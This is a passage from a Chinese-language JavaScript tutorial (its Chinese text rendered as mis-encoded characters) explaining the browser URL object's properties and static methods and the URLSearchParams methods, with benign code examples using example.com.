<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var url1 &#x3D; new URL(&#39;index.html&#39;, &#39;http:&#x2F;&#x2F;example.com&#39;);</span><br><span class="line">url1.href</span><br><span class="line">&#x2F;&#x2F; &quot;http:&#x2F;&#x2F;example.com&#x2F;index.html&quot;</span><br><span class="line"></span><br><span class="line">var url2 &#x3D; new URL(&#39;page2.html&#39;, &#39;http:&#x2F;&#x2F;example.com&#x2F;page1.html&#39;);</span><br><span class="line">url2.href</span><br><span class="line">&#x2F;&#x2F; &quot;http:&#x2F;&#x2F;example.com&#x2F;page2.html&quot;</span><br><span class="line"></span><br><span class="line">var url3 &#x3D; new URL(&#39;..&#39;, &#39;http:&#x2F;&#x2F;example.com&#x2F;a&#x2F;b.html&#39;)</span><br><span class="line">url3.href</span><br><span class="line">&#x2F;&#x2F; &quot;http:&#x2F;&#x2F;example.com&#x2F;&quot;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œè¿”å›çš„ URL å®ä¾‹çš„è·¯å¾„éƒ½æ˜¯åœ¨ç¬¬äºŒä¸ªå‚æ•°çš„åŸºç¡€ä¸Šï¼Œåˆ‡æ¢åˆ°ç¬¬ä¸€ä¸ªå‚æ•°å¾—åˆ°çš„ã€‚æœ€åä¸€ä¸ªä¾‹å­é‡Œé¢ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯<code>..</code>ï¼Œè¡¨ç¤ºä¸Šå±‚è·¯å¾„ã€‚</p>
<h4 id="å®ä¾‹å±æ€§"><a href="#å®ä¾‹å±æ€§" class="headerlink" title="å®ä¾‹å±æ€§"></a>å®ä¾‹å±æ€§</h4><p>URL å®ä¾‹çš„å±æ€§ä¸<code>Location</code>å¯¹è±¡çš„å±æ€§åŸºæœ¬ä¸€è‡´ï¼Œè¿”å›å½“å‰ URL çš„ä¿¡æ¯ã€‚</p>
<ul>
<li>URL.hrefï¼šè¿”å›æ•´ä¸ª URL</li>
<li>URL.protocolï¼šè¿”å›åè®®ï¼Œä»¥å†’å·<code>:</code>ç»“å°¾</li>
<li>URL.hostnameï¼šè¿”å›åŸŸå</li>
<li>URL.hostï¼šè¿”å›åŸŸåä¸ç«¯å£ï¼ŒåŒ…å«<code>:</code>å·ï¼Œé»˜è®¤çš„80å’Œ443ç«¯å£ä¼šçœç•¥</li>
<li>URL.portï¼šè¿”å›ç«¯å£</li>
<li>URL.originï¼šè¿”å›åè®®ã€åŸŸåå’Œç«¯å£</li>
<li>URL.pathnameï¼šè¿”å›è·¯å¾„ï¼Œä»¥æ–œæ <code>/</code>å¼€å¤´</li>
<li>URL.searchï¼šè¿”å›æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œä»¥é—®å·<code>?</code>å¼€å¤´</li>
<li>URL.searchParamsï¼šè¿”å›ä¸€ä¸ª<code>URLSearchParams</code>å®ä¾‹ï¼Œè¯¥å±æ€§æ˜¯<code>Location</code>å¯¹è±¡æ²¡æœ‰çš„</li>
<li>URL.hashï¼šè¿”å›ç‰‡æ®µè¯†åˆ«ç¬¦ï¼Œä»¥äº•å·<code>#</code>å¼€å¤´</li>
<li>URL.passwordï¼šè¿”å›åŸŸåå‰é¢çš„å¯†ç </li>
<li>URL.usernameï¼šè¿”å›åŸŸåå‰é¢çš„ç”¨æˆ·å</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">var url &#x3D; new URL(&#39;http:&#x2F;&#x2F;user:passwd@www.example.com:4097&#x2F;path&#x2F;a.html?x&#x3D;111#part1&#39;);</span><br><span class="line"></span><br><span class="line">url.href</span><br><span class="line">&#x2F;&#x2F; &quot;http:&#x2F;&#x2F;user:passwd@www.example.com:4097&#x2F;path&#x2F;a.html?x&#x3D;111#part1&quot;</span><br><span class="line">url.protocol</span><br><span class="line">&#x2F;&#x2F; &quot;http:&quot;</span><br><span class="line">url.hostname</span><br><span class="line">&#x2F;&#x2F; &quot;www.example.com&quot;</span><br><span class="line">url.host</span><br><span class="line">&#x2F;&#x2F; &quot;www.example.com:4097&quot;</span><br><span class="line">url.port</span><br><span class="line">&#x2F;&#x2F; &quot;4097&quot;</span><br><span class="line">url.origin</span><br><span class="line">&#x2F;&#x2F; &quot;http:&#x2F;&#x2F;www.example.com:4097&quot;</span><br><span class="line">url.pathname</span><br><span class="line">&#x2F;&#x2F; &quot;&#x2F;path&#x2F;a.html&quot;</span><br><span class="line">url.search</span><br><span class="line">&#x2F;&#x2F; &quot;?x&#x3D;111&quot;</span><br><span class="line">url.searchParams</span><br><span class="line">&#x2F;&#x2F; URLSearchParams &#123;&#125;</span><br><span class="line">url.hash</span><br><span class="line">&#x2F;&#x2F; &quot;#part1&quot;</span><br><span class="line">url.password</span><br><span class="line">&#x2F;&#x2F; &quot;passwd&quot;</span><br><span class="line">url.username</span><br><span class="line">&#x2F;&#x2F; &quot;user&quot;</span><br></pre></td></tr></table></figure>

<p>è¿™äº›å±æ€§é‡Œé¢ï¼Œåªæœ‰<code>origin</code>å±æ€§æ˜¯åªè¯»çš„ï¼Œå…¶ä»–å±æ€§éƒ½å¯å†™ï¼Œå¹¶ä¸”ä¼šç«‹å³ç”Ÿæ•ˆã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var url &#x3D; new URL(&#39;http:&#x2F;&#x2F;example.com&#x2F;index.html#part1&#39;);</span><br><span class="line"></span><br><span class="line">url.pathname &#x3D; &#39;index2.html&#39;;</span><br><span class="line">url.href &#x2F;&#x2F; &quot;http:&#x2F;&#x2F;example.com&#x2F;index2.html#part1&quot;</span><br><span class="line"></span><br><span class="line">url.hash &#x3D; &#39;#part2&#39;;</span><br><span class="line">url.href &#x2F;&#x2F; &quot;http:&#x2F;&#x2F;example.com&#x2F;index2.html#part2&quot;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œæ”¹å˜ URL å®ä¾‹çš„<code>pathname</code>å±æ€§å’Œ<code>hash</code>å±æ€§ï¼Œéƒ½ä¼šå®æ—¶åæ˜ åœ¨ URL å®ä¾‹å½“ä¸­ã€‚</p>
<h4 id="é™æ€æ–¹æ³•"><a href="#é™æ€æ–¹æ³•" class="headerlink" title="é™æ€æ–¹æ³•"></a>é™æ€æ–¹æ³•</h4><p><strong>ï¼ˆ1ï¼‰URL.createObjectURL()</strong></p>
<p><code>URL.createObjectURL()</code>æ–¹æ³•ç”¨æ¥ä¸ºä¸Šä¼ &#x2F;ä¸‹è½½çš„æ–‡ä»¶ã€æµåª’ä½“æ–‡ä»¶ç”Ÿæˆä¸€ä¸ª URL å­—ç¬¦ä¸²ã€‚è¿™ä¸ªå­—ç¬¦ä¸²ä»£è¡¨äº†<code>File</code>å¯¹è±¡æˆ–<code>Blob</code>å¯¹è±¡çš„ URLã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; HTML ä»£ç å¦‚ä¸‹</span><br><span class="line">&#x2F;&#x2F; &lt;div id&#x3D;&quot;display&quot;&#x2F;&gt;</span><br><span class="line">&#x2F;&#x2F; &lt;input</span><br><span class="line">&#x2F;&#x2F;   type&#x3D;&quot;file&quot;</span><br><span class="line">&#x2F;&#x2F;   id&#x3D;&quot;fileElem&quot;</span><br><span class="line">&#x2F;&#x2F;   multiple</span><br><span class="line">&#x2F;&#x2F;   accept&#x3D;&quot;image&#x2F;*&quot;</span><br><span class="line">&#x2F;&#x2F;   onchange&#x3D;&quot;handleFiles(this.files)&quot;</span><br><span class="line">&#x2F;&#x2F;  &gt;</span><br><span class="line">var div &#x3D; document.getElementById(&#39;display&#39;);</span><br><span class="line"></span><br><span class="line">function handleFiles(files) &#123;</span><br><span class="line">  for (var i &#x3D; 0; i &lt; files.length; i++) &#123;</span><br><span class="line">    var img &#x3D; document.createElement(&#39;img&#39;);</span><br><span class="line">    img.src &#x3D; window.URL.createObjectURL(files[i]);</span><br><span class="line">    div.appendChild(img);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>URL.createObjectURL()</code>æ–¹æ³•ç”¨æ¥ä¸ºä¸Šä¼ çš„æ–‡ä»¶ç”Ÿæˆä¸€ä¸ª URL å­—ç¬¦ä¸²ï¼Œä½œä¸º<code>&lt;img&gt;</code>å…ƒç´ çš„å›¾ç‰‡æ¥æºã€‚</p>
<p>è¯¥æ–¹æ³•ç”Ÿæˆçš„ URL å°±åƒä¸‹é¢çš„æ ·å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blob:http:&#x2F;&#x2F;localhost&#x2F;c745ef73-ece9-46da-8f66-ebes574789b1</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼Œæ¯æ¬¡ä½¿ç”¨<code>URL.createObjectURL()</code>æ–¹æ³•ï¼Œéƒ½ä¼šåœ¨å†…å­˜é‡Œé¢ç”Ÿæˆä¸€ä¸ª URL å®ä¾‹ã€‚å¦‚æœä¸å†éœ€è¦è¯¥æ–¹æ³•ç”Ÿæˆçš„ URL å­—ç¬¦ä¸²ï¼Œä¸ºäº†èŠ‚çœå†…å­˜ï¼Œå¯ä»¥ä½¿ç”¨<code>URL.revokeObjectURL()</code>æ–¹æ³•é‡Šæ”¾è¿™ä¸ªå®ä¾‹ã€‚</p>
<p><strong>ï¼ˆ2ï¼‰URL.revokeObjectURL()</strong></p>
<p><code>URL.revokeObjectURL()</code>æ–¹æ³•ç”¨æ¥é‡Šæ”¾<code>URL.createObjectURL()</code>æ–¹æ³•ç”Ÿæˆçš„ URL å®ä¾‹ã€‚å®ƒçš„å‚æ•°å°±æ˜¯<code>URL.createObjectURL()</code>æ–¹æ³•è¿”å›çš„ URL å­—ç¬¦ä¸²ã€‚</p>
<p>ä¸‹é¢ä¸ºä¸Šä¸€æ®µçš„ç¤ºä¾‹åŠ ä¸Š<code>URL.revokeObjectURL()</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var div &#x3D; document.getElementById(&#39;display&#39;);</span><br><span class="line"></span><br><span class="line">function handleFiles(files) &#123;</span><br><span class="line">  for (var i &#x3D; 0; i &lt; files.length; i++) &#123;</span><br><span class="line">    var img &#x3D; document.createElement(&#39;img&#39;);</span><br><span class="line">    img.src &#x3D; window.URL.createObjectURL(files[i]);</span><br><span class="line">    div.appendChild(img);</span><br><span class="line">    img.onload &#x3D; function() &#123;</span><br><span class="line">      window.URL.revokeObjectURL(this.src);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œä¸€æ—¦å›¾ç‰‡åŠ è½½æˆåŠŸä»¥åï¼Œä¸ºæœ¬åœ°æ–‡ä»¶ç”Ÿæˆçš„ URL å­—ç¬¦ä¸²å°±æ²¡ç”¨äº†ï¼Œäºæ˜¯å¯ä»¥åœ¨<code>img.onload</code>å›è°ƒå‡½æ•°é‡Œé¢ï¼Œé€šè¿‡<code>URL.revokeObjectURL()</code>æ–¹æ³•å¸è½½è¿™ä¸ª URL å®ä¾‹ã€‚</p>
<h3 id="URLSearchParams-å¯¹è±¡"><a href="#URLSearchParams-å¯¹è±¡" class="headerlink" title="URLSearchParams å¯¹è±¡"></a>URLSearchParams å¯¹è±¡</h3><h4 id="æ¦‚è¿°-5"><a href="#æ¦‚è¿°-5" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h4><p><code>URLSearchParams</code>å¯¹è±¡æ˜¯æµè§ˆå™¨çš„åŸç”Ÿå¯¹è±¡ï¼Œç”¨æ¥æ„é€ ã€è§£æå’Œå¤„ç† URL çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆå³ URL é—®å·åé¢çš„éƒ¨åˆ†ï¼‰ã€‚</p>
<p>å®ƒæœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œå¯ä»¥ç”Ÿæˆå®ä¾‹ã€‚å‚æ•°å¯ä»¥ä¸ºæŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œèµ·é¦–çš„é—®å·<code>?</code>æœ‰æ²¡æœ‰éƒ½è¡Œï¼Œä¹Ÿå¯ä»¥æ˜¯å¯¹åº”æŸ¥è¯¢å­—ç¬¦ä¸²çš„æ•°ç»„æˆ–å¯¹è±¡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; æ–¹æ³•ä¸€ï¼šä¼ å…¥å­—ç¬¦ä¸²</span><br><span class="line">var params &#x3D; new URLSearchParams(&#39;?foo&#x3D;1&amp;bar&#x3D;2&#39;);</span><br><span class="line">&#x2F;&#x2F; ç­‰åŒäº</span><br><span class="line">var params &#x3D; new URLSearchParams(document.location.search);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; æ–¹æ³•äºŒï¼šä¼ å…¥æ•°ç»„</span><br><span class="line">var params &#x3D; new URLSearchParams([[&#39;foo&#39;, 1], [&#39;bar&#39;, 2]]);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; æ–¹æ³•ä¸‰ï¼šä¼ å…¥å¯¹è±¡</span><br><span class="line">var params &#x3D; new URLSearchParams(&#123;&#39;foo&#39; : 1 , &#39;bar&#39; : 2&#125;);</span><br></pre></td></tr></table></figure>

<p><code>URLSearchParams</code>ä¼šå¯¹æŸ¥è¯¢å­—ç¬¦ä¸²è‡ªåŠ¨ç¼–ç ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var params &#x3D; new URLSearchParams(&#123;&#39;foo&#39;: &#39;ä½ å¥½&#39;&#125;);</span><br><span class="line">params.toString() &#x2F;&#x2F; &quot;foo&#x3D;%E4%BD%A0%E5%A5%BD&quot;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>foo</code>çš„å€¼æ˜¯æ±‰å­—ï¼Œ<code>URLSearchParams</code>å¯¹å…¶è‡ªåŠ¨è¿›è¡Œ URL ç¼–ç ã€‚</p>
<p>æµè§ˆå™¨å‘æœåŠ¡å™¨å‘é€è¡¨å•æ•°æ®æ—¶ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨<code>URLSearchParams</code>å®ä¾‹ä½œä¸ºè¡¨å•æ•°æ®ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const params &#x3D; new URLSearchParams(&#123;foo: 1, bar: 2&#125;);</span><br><span class="line">fetch(&#39;https:&#x2F;&#x2F;example.com&#x2F;api&#39;, &#123;</span><br><span class="line">  method: &#39;POST&#39;,</span><br><span class="line">  body: params</span><br><span class="line">&#125;).then(...)</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>fetch</code>å‘½ä»¤å‘æœåŠ¡å™¨å‘é€å‘½ä»¤æ—¶ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨<code>URLSearchParams</code>å®ä¾‹ã€‚</p>
<p><code>URLSearchParams</code>å¯ä»¥ä¸<code>URL()</code>æ¥å£ç»“åˆä½¿ç”¨ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var url &#x3D; new URL(window.location);</span><br><span class="line">var foo &#x3D; url.searchParams.get(&#39;foo&#39;) || &#39;somedefault&#39;;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼ŒURL å®ä¾‹çš„<code>searchParams</code>å±æ€§å°±æ˜¯ä¸€ä¸ª<code>URLSearchParams</code>å®ä¾‹ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨<code>URLSearchParams</code>æ¥å£çš„<code>get</code>æ–¹æ³•ã€‚</p>
<p><code>URLSearchParams</code>å®ä¾‹æœ‰éå†å™¨æ¥å£ï¼Œå¯ä»¥ç”¨<code>for...of</code>å¾ªç¯éå†ï¼ˆè¯¦è§ã€ŠES6 æ ‡å‡†å…¥é—¨ã€‹çš„ã€ŠIteratorã€‹ä¸€ç« ï¼‰ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var params &#x3D; new URLSearchParams(&#123;&#39;foo&#39;: 1 , &#39;bar&#39;: 2&#125;);</span><br><span class="line"></span><br><span class="line">for (var p of params) &#123;</span><br><span class="line">  console.log(p[0] + &#39;: &#39; + p[1]);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; foo: 1</span><br><span class="line">&#x2F;&#x2F; bar: 2</span><br></pre></td></tr></table></figure>

<p><code>URLSearchParams</code>æ²¡æœ‰å®ä¾‹å±æ€§ï¼Œåªæœ‰å®ä¾‹æ–¹æ³•ã€‚</p>
<h4 id="URLSearchParams-toString"><a href="#URLSearchParams-toString" class="headerlink" title="URLSearchParams.toString()"></a>URLSearchParams.toString()</h4><p><code>toString</code>æ–¹æ³•è¿”å›å®ä¾‹çš„å­—ç¬¦ä¸²å½¢å¼ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var url &#x3D; new URL(&#39;https:&#x2F;&#x2F;example.com?foo&#x3D;1&amp;bar&#x3D;2&#39;);</span><br><span class="line">var params &#x3D; new URLSearchParams(url.search);</span><br><span class="line"></span><br><span class="line">params.toString() &#x2F;&#x2F; &quot;foo&#x3D;1&amp;bar&#x3D;2&#39;</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆéœ€è¦å­—ç¬¦ä¸²çš„åœºåˆï¼Œä¼šè‡ªåŠ¨è°ƒç”¨<code>toString</code>æ–¹æ³•ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var params &#x3D; new URLSearchParams(&#123;version: 2.0&#125;);</span><br><span class="line">window.location.href &#x3D; location.pathname + &#39;?&#39; + params;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>location.href</code>èµ‹å€¼æ—¶ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨<code>params</code>å¯¹è±¡ã€‚è¿™æ—¶å°±ä¼šè‡ªåŠ¨è°ƒç”¨<code>toString</code>æ–¹æ³•ã€‚</p>
<h4 id="URLSearchParams-append"><a href="#URLSearchParams-append" class="headerlink" title="URLSearchParams.append()"></a>URLSearchParams.append()</h4><p><code>append()</code>æ–¹æ³•ç”¨æ¥è¿½åŠ ä¸€ä¸ªæŸ¥è¯¢å‚æ•°ã€‚å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªä¸ºé”®åï¼Œç¬¬äºŒä¸ªä¸ºé”®å€¼ï¼Œæ²¡æœ‰è¿”å›å€¼ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var params &#x3D; new URLSearchParams(&#123;&#39;foo&#39;: 1 , &#39;bar&#39;: 2&#125;);</span><br><span class="line">params.append(&#39;baz&#39;, 3);</span><br><span class="line">params.toString() &#x2F;&#x2F; &quot;foo&#x3D;1&amp;bar&#x3D;2&amp;baz&#x3D;3&quot;</span><br></pre></td></tr></table></figure>

<p><code>append()</code>æ–¹æ³•ä¸ä¼šè¯†åˆ«æ˜¯å¦é”®åå·²ç»å­˜åœ¨ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var params &#x3D; new URLSearchParams(&#123;&#39;foo&#39;: 1 , &#39;bar&#39;: 2&#125;);</span><br><span class="line">params.append(&#39;foo&#39;, 3);</span><br><span class="line">params.toString() &#x2F;&#x2F; &quot;foo&#x3D;1&amp;bar&#x3D;2&amp;foo&#x3D;3&quot;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼ŒæŸ¥è¯¢å­—ç¬¦ä¸²é‡Œé¢<code>foo</code>å·²ç»å­˜åœ¨äº†ï¼Œä½†æ˜¯<code>append</code>ä¾ç„¶ä¼šè¿½åŠ ä¸€ä¸ªåŒåé”®ã€‚</p>
<h4 id="URLSearchParams-delete"><a href="#URLSearchParams-delete" class="headerlink" title="URLSearchParams.delete()"></a>URLSearchParams.delete()</h4><p><code>delete()</code>æ–¹æ³•ç”¨æ¥åˆ é™¤æŒ‡å®šçš„æŸ¥è¯¢å‚æ•°ã€‚å®ƒæ¥å—é”®åä½œä¸ºå‚æ•°ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var params &#x3D; new URLSearchParams(&#123;&#39;foo&#39;: 1 , &#39;bar&#39;: 2&#125;);</span><br><span class="line">params.delete(&#39;bar&#39;);</span><br><span class="line">params.toString() &#x2F;&#x2F; &quot;foo&#x3D;1&quot;</span><br></pre></td></tr></table></figure>

<h4 id="URLSearchParams-has"><a href="#URLSearchParams-has" class="headerlink" title="URLSearchParams.has()"></a>URLSearchParams.has()</h4><p><code>has()</code>æ–¹æ³•è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæŸ¥è¯¢å­—ç¬¦ä¸²æ˜¯å¦åŒ…å«æŒ‡å®šçš„é”®åã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var params &#x3D; new URLSearchParams(&#123;&#39;foo&#39;: 1 , &#39;bar&#39;: 2&#125;);</span><br><span class="line">params.has(&#39;bar&#39;) &#x2F;&#x2F; true</span><br><span class="line">params.has(&#39;baz&#39;) &#x2F;&#x2F; false</span><br></pre></td></tr></table></figure>

<h4 id="URLSearchParams-set"><a href="#URLSearchParams-set" class="headerlink" title="URLSearchParams.set()"></a>URLSearchParams.set()</h4><p><code>set()</code>æ–¹æ³•ç”¨æ¥è®¾ç½®æŸ¥è¯¢å­—ç¬¦ä¸²çš„é”®å€¼ã€‚</p>
<p>å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯é”®åï¼Œç¬¬äºŒä¸ªæ˜¯é”®å€¼ã€‚å¦‚æœæ˜¯å·²ç»å­˜åœ¨çš„é”®ï¼Œé”®å€¼ä¼šè¢«æ”¹å†™ï¼Œå¦åˆ™ä¼šè¢«è¿½åŠ ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var params &#x3D; new URLSearchParams(&#39;?foo&#x3D;1&#39;);</span><br><span class="line">params.set(&#39;foo&#39;, 2);</span><br><span class="line">params.toString() &#x2F;&#x2F; &quot;foo&#x3D;2&quot;</span><br><span class="line">params.set(&#39;bar&#39;, 3);</span><br><span class="line">params.toString() &#x2F;&#x2F; &quot;foo&#x3D;2&amp;bar&#x3D;3&quot;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>foo</code>æ˜¯å·²ç»å­˜åœ¨çš„é”®ï¼Œ<code>bar</code>æ˜¯è¿˜ä¸å­˜åœ¨çš„é”®ã€‚</p>
<p>å¦‚æœæœ‰å¤šä¸ªçš„åŒåé”®ï¼Œ<code>set</code>ä¼šç§»é™¤ç°å­˜æ‰€æœ‰çš„é”®ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var params &#x3D; new URLSearchParams(&#39;?foo&#x3D;1&amp;foo&#x3D;2&#39;);</span><br><span class="line">params.set(&#39;foo&#39;, 3);</span><br><span class="line">params.toString() &#x2F;&#x2F; &quot;foo&#x3D;3&quot;</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢æ˜¯ä¸€ä¸ªæ›¿æ¢å½“å‰ URL çš„ä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; URL: https:&#x2F;&#x2F;example.com?version&#x3D;1.0</span><br><span class="line">var params &#x3D; new URLSearchParams(location.search.slice(1));</span><br><span class="line">params.set(&#39;version&#39;, &#39;2.0&#39;);</span><br><span class="line"></span><br><span class="line">window.history.replaceState(&#123;&#125;, &#39;&#39;, location.pathname + &#96;?&#96; + params);</span><br><span class="line">&#x2F;&#x2F; URL: https:&#x2F;&#x2F;example.com?version&#x3D;2.0</span><br></pre></td></tr></table></figure>

<h4 id="URLSearchParams-get-ï¼ŒURLSearchParams-getAll"><a href="#URLSearchParams-get-ï¼ŒURLSearchParams-getAll" class="headerlink" title="URLSearchParams.get()ï¼ŒURLSearchParams.getAll()"></a>URLSearchParams.get()ï¼ŒURLSearchParams.getAll()</h4><p><code>get()</code>æ–¹æ³•ç”¨æ¥è¯»å–æŸ¥è¯¢å­—ç¬¦ä¸²é‡Œé¢çš„æŒ‡å®šé”®ã€‚å®ƒæ¥å—é”®åä½œä¸ºå‚æ•°ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var params &#x3D; new URLSearchParams(&#39;?foo&#x3D;1&#39;);</span><br><span class="line">params.get(&#39;foo&#39;) &#x2F;&#x2F; &quot;1&quot;</span><br><span class="line">params.get(&#39;bar&#39;) &#x2F;&#x2F; null</span><br></pre></td></tr></table></figure>

<p>ä¸¤ä¸ªåœ°æ–¹éœ€è¦æ³¨æ„ã€‚ç¬¬ä¸€ï¼Œå®ƒè¿”å›çš„æ˜¯å­—ç¬¦ä¸²ï¼Œå¦‚æœåŸå§‹å€¼æ˜¯æ•°å€¼ï¼Œéœ€è¦è½¬ä¸€ä¸‹ç±»å‹ï¼›ç¬¬äºŒï¼Œå¦‚æœæŒ‡å®šçš„é”®åä¸å­˜åœ¨ï¼Œè¿”å›å€¼æ˜¯<code>null</code>ã€‚</p>
<p>å¦‚æœæœ‰å¤šä¸ªçš„åŒåé”®ï¼Œ<code>get</code>è¿”å›ä½ç½®æœ€å‰é¢çš„é‚£ä¸ªé”®å€¼ã€‚</p>
